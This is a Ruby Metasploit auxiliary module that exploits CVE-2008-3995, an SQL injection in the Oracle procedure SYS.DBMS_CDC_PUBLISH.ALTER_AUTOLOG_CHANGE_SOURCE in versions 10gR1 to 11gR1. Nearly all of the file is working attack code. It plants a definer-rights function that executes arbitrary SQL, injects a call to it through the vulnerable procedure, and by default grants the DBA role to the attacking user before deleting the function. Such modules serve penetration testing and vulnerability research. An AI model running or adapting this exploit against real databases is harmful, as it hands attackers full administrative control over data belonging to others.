##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE',
      'Description'    => %q{
        The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE
        procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
        on the vulnerable package can exploit this vulnerability. By default, users granted
        EXECUTE_CATALOG_ROLE have the required privilege.
        Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1.
        Fixed with October 2008 CPU.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-3995' ],
          [ 'OSVDB', '49320'],
          [ 'URL', 'http://www.appsecinc.com/resources/alerts/oracle/2008-09.shtml' ],
        ],
      'DisclosureDate' => 'Oct 22 2008'))

      register_options(
        [
          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
        ], self.class)
  end

  def run
    return if not check_dependencies

    name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

    function = "
      CREATE OR REPLACE FUNCTION #{name}
      RETURN VARCHAR2 AUTHID CURRENT_USER
      IS
      PRAGMA AUTONOMOUS_TRANSACTION;
      BEGIN
      EXECUTE IMMEDIATE '#{datastore['SQL']}';
      COMMIT;
      RETURN NULL;
      END;"

    package = "
      BEGIN
      SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE('''||'||user||'.#{name}||''');
      END;
      "

    clean = "DROP FUNCTION #{name}"

    begin
      print_status("Sending function...")
      prepare_exec(function)
    rescue => e
      return
    end
    print_status("Attempting sql injection on SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE...")
    prepare_exec(package)

    print_status("Done! Removing function '#{name}'...")
    prepare_exec(clean)
  end

end
